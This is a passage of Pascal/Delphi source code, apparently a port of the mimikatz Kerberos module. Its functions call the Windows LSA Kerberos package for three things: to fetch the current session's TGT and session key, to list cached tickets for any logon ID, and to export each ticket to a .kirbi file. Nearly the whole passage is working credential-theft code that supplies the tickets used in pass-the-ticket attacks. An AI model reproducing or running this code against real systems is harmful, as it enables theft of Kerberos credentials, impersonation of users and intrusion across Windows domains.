				//else if packageStatus = STATUS_NO_TRUST_SAM_ACCOUNT then log(' Kerberos name not found!\n'+ strpas(pKerbRetrieveRequest^.TargetName.Buffer) );
				else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n'+inttohex(packageStatus,8));
			end
			else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : ' +inttohex(status,8));
                        //0xC000005E STATUS_NO_LOGON_SERVERS
			freemem(pKerbRetrieveRequest);
		end
	end
	else log('At least /target argument is required (eg: /target:cifs/server.lab.local)\n');
	result:= STATUS_SUCCESS;
end;

function kuhl_m_kerberos_tgt(logonid:int64=0):NTSTATUS;
var
	status, packageStatus:NTSTATUS;
	kerbRetrieveRequest:KERB_RETRIEVE_TKT_REQUEST;// = {KerbRetrieveTicketMessage, {0, 0}, {0, 0, NULL}, 0, 0, KERB_ETYPE_NULL, {0, 0}};
	pKerbRetrieveResponse:PKERB_RETRIEVE_TKT_RESPONSE;
	szData:DWORD;
	kiwiTicket:KIWI_KERBEROS_TICKET; // = {0};
	i:DWORD;
	isNull:BOOL = FALSE;
begin
        fillchar(kerbRetrieveRequest,sizeof(KERB_RETRIEVE_TKT_REQUEST),0);
        kerbRetrieveRequest.MessageType:=KerbRetrieveTicketMessage;
        kerbRetrieveRequest.EncryptionType := KERB_ETYPE_NULL;

        fillchar(kiwiTicket,sizeof(KIWI_KERBEROS_TICKET),0);

        if logonid <>0 then
        begin
        kerbRetrieveRequest.LogonId.HighPart :=_luid(logonid).HighPart ;
        kerbRetrieveRequest.LogonId.lowpart :=_luid(logonid).lowpart ;
        log('LUID:'+inttohex(logonid,8),1)
        end;

	status := LsaCallKerberosPackage(@kerbRetrieveRequest, sizeof(KERB_RETRIEVE_TKT_REQUEST), @pKerbRetrieveResponse, @szData, @packageStatus);

	if NT_SUCCESS(status) then
	begin
		if NT_SUCCESS(packageStatus) then
		begin
                        log('Kerberos TGT of current session : ',1);
			kiwiTicket.ServiceName := pKerbRetrieveResponse^.Ticket.ServiceName;
			kiwiTicket.TargetName := pKerbRetrieveResponse^.Ticket.TargetName;
			kiwiTicket.ClientName := pKerbRetrieveResponse^.Ticket.ClientName;
			kiwiTicket.DomainName := pKerbRetrieveResponse^.Ticket.DomainName;
			kiwiTicket.TargetDomainName := pKerbRetrieveResponse^.Ticket.TargetDomainName;
			kiwiTicket.AltTargetDomainName := pKerbRetrieveResponse^.Ticket.AltTargetDomainName;
			kiwiTicket.TicketFlags := pKerbRetrieveResponse^.Ticket.TicketFlags;
			kiwiTicket.KeyType := pKerbRetrieveResponse^.Ticket.SessionKey.KeyType;
                        kiwiTicket.TicketEncType := pKerbRetrieveResponse^.Ticket.SessionKey.KeyType; // TicketEncType not in response
			kiwiTicket.Key.Length := pKerbRetrieveResponse^.Ticket.SessionKey.Length;
			kiwiTicket.Key.Value := pKerbRetrieveResponse^.Ticket.SessionKey.Value;
			kiwiTicket.StartTime := filetime(pKerbRetrieveResponse^.Ticket.StartTime);
			kiwiTicket.EndTime := filetime(pKerbRetrieveResponse^.Ticket.EndTime);
			kiwiTicket.RenewUntil := filetime(pKerbRetrieveResponse^.Ticket.RenewUntil);
			kiwiTicket.Ticket.Length := pKerbRetrieveResponse^.Ticket.EncodedTicketSize;
			kiwiTicket.Ticket.Value := pKerbRetrieveResponse^.Ticket.EncodedTicket;
			kuhl_m_kerberos_ticket_display(@kiwiTicket, TRUE, FALSE);

                        {
			for(i = 0; !isNull && (i < kiwiTicket.Key.Length); i++) // a revoir
				isNull |= !kiwiTicket.Key.Value[i];
			if(isNull)
				kprintf(L"\n\n\t** Session key is NULL! It means allowtgtsessionkey is not set to 1 **\n");
                        }
			LsaFreeReturnBuffer(pKerbRetrieveResponse);
		end
		//else if(packageStatus = SEC_E_NO_CREDENTIALS) then log('no ticket !',1);
		else log('LsaCallAuthenticationPackage KerbRetrieveTicketMessage / Package : '+inttohex(packageStatus,8),1);
	end
	else log('LsaCallAuthenticationPackage KerbRetrieveTicketMessage : '+inttohex(status,8),1);

        //0xC000000D STATUS_INVALID_PARAMETER

	result:= STATUS_SUCCESS;
end;

function kuhl_m_kerberos_list(logonid:int64=0):NTSTATUS;
var
	status, packageStatus:NTSTATUS;
	kerbCacheRequest:KERB_QUERY_TKT_CACHE_REQUEST; // = {KerbQueryTicketCacheExMessage, {0, 0}};
	pKerbCacheResponse:PKERB_QUERY_TKT_CACHE_EX_RESPONSE;
	pKerbRetrieveRequest:PKERB_RETRIEVE_TKT_REQUEST;
	pKerbRetrieveResponse:PKERB_RETRIEVE_TKT_RESPONSE;
	szData, i:DWORD;
	filename:string;
	export_:BOOL=false;// = kull_m_string_args_byName(argc, argv, L'export', NULL, NULL);
begin
        fillchar(kerbCacheRequest,sizeof(KERB_QUERY_TKT_CACHE_REQUEST),0);
        kerbCacheRequest.MessageType:=KerbQueryTicketCacheExMessage;

        if logonid <>0 then
        begin
        kerbCacheRequest.LogonId.HighPart:=_luid(logonid).HighPart  ;
        kerbCacheRequest.LogonId.lowpart:=_luid(logonid).lowpart  ;
        log('LUID:'+inttohex(logonid ,8));
        end;

        status := LsaCallKerberosPackage(@kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), @pKerbCacheResponse, @szData, @packageStatus);

        if (NT_SUCCESS(status)) then
	begin
		if (NT_SUCCESS(packageStatus)) then
		begin
                    if pKerbCacheResponse^.CountOfTickets=0 then
                    begin
                    log('no tickets',1);
                    exit;
                    end;
			for i:= 0 to pKerbCacheResponse^.CountOfTickets-1 do
			begin
                                log('***********************************',1);
                                if logonid <>0 then
                                   begin
                                   log('LUID:'+inttohex(logonid ,8),1);
                                   end;
				log('EncryptionType:'+inttohex( pKerbCacheResponse^.Tickets[i].EncryptionType,8),1); // kuhl_m_kerberos_ticket_etype(pKerbCacheResponse^.Tickets[i].EncryptionType));
				log('StartTime:'+kull_m_string_displayLocalFileTime(pfiletime(@pKerbCacheResponse^.Tickets[i].StartTime)),1);
				log('EndTime:'+kull_m_string_displayLocalFileTime(pfiletime(@pKerbCacheResponse^.Tickets[i].EndTime )),1);
				log('RenewTime:'+kull_m_string_displayLocalFileTime(pfiletime(@pKerbCacheResponse^.Tickets[i].RenewTime )),1);
				log('Server Name:'+ UNICODE_STRING_to_ANSISTRING (pKerbCacheResponse^.Tickets[i].ServerName),1); //serverrealm?
				log('Client Name:'+ UNICODE_STRING_to_ANSISTRING(pKerbCacheResponse^.Tickets[i].ClientName),1); //clientrealm?
				log('Flags:'+inttohex(pKerbCacheResponse^.Tickets[i].TicketFlags,8),1);
				//kuhl_m_kerberos_ticket_displayFlags(pKerbCacheResponse^.Tickets[i].TicketFlags);
                                log('***********************************',1);

				if(export_) then
				begin
					szData := sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse^.Tickets[i].ServerName.MaximumLength;
                                        pKerbRetrieveRequest:=allocmem(szData);
					if pKerbRetrieveRequest<>nil then
					begin
						pKerbRetrieveRequest^.MessageType := KerbRetrieveEncodedTicketMessage;
						pKerbRetrieveRequest^.CacheOptions := {KERB_RETRIEVE_TICKET_USE_CACHE_ONLY | }KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						pKerbRetrieveRequest^.TicketFlags := pKerbCacheResponse^.Tickets[i].TicketFlags;
						pKerbRetrieveRequest^.TargetName := pKerbCacheResponse^.Tickets[i].ServerName;
						pKerbRetrieveRequest^.TargetName.Buffer := pointer(nativeuint(pKerbRetrieveRequest) + sizeof(KERB_RETRIEVE_TKT_REQUEST));
						//RtlCopyMemory(pKerbRetrieveRequest^.TargetName.Buffer, pKerbCacheResponse^.Tickets[i].ServerName.Buffer, pKerbRetrieveRequest^.TargetName.MaximumLength);
                                                copymemory(pKerbRetrieveRequest^.TargetName.Buffer, pKerbCacheResponse^.Tickets[i].ServerName.Buffer, pKerbRetrieveRequest^.TargetName.MaximumLength);

						status := LsaCallKerberosPackage(pKerbRetrieveRequest, szData, @pKerbRetrieveResponse, @szData, @packageStatus);
						if (NT_SUCCESS(status)) then
						begin
							if (NT_SUCCESS(packageStatus)) then
							begin

                                                                filename:='ticket.kirbi';
                                                                filename:=inttohex(pKerbCacheResponse^.Tickets[i].TicketFlags,8)+'-'+UNICODE_STRING_to_ANSISTRING(pKerbCacheResponse^.Tickets[i].ClientName) +'@'+UNICODE_STRING_to_ANSISTRING(pKerbCacheResponse^.Tickets[i].ClientRealm) +'-'+UNICODE_STRING_to_ANSISTRING(pKerbCacheResponse^.Tickets[i].ServerName ) +'.kirbi';
								//if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse^.Tickets[i], MIMIKATZ_KERBEROS_EXT))
								begin
									if(kull_m_file_writeData(pchar(filename), pKerbRetrieveResponse^.Ticket.EncodedTicket, pKerbRetrieveResponse^.Ticket.EncodedTicketSize))
                                                                        then log('Saved to file:'+ filename,1)
									else log('kull_m_file_writeData failed',1);
									//LocalFree(filename);
								end;
								LsaFreeReturnBuffer(pKerbRetrieveResponse);
							end
							else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : '+inttohex(packageStatus,8),1);
						end
						else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : '+inttohex(status,8),1);

						freemem(pKerbRetrieveRequest);
					end;
				end;
			end;
			LsaFreeReturnBuffer(pKerbCacheResponse);
		end
		else log('LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message / Package : '+inttohex(packageStatus,8),1);
	end
	else log('LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message : '+inttohex(status,8),1);

	result:= STATUS_SUCCESS;
end;


end.

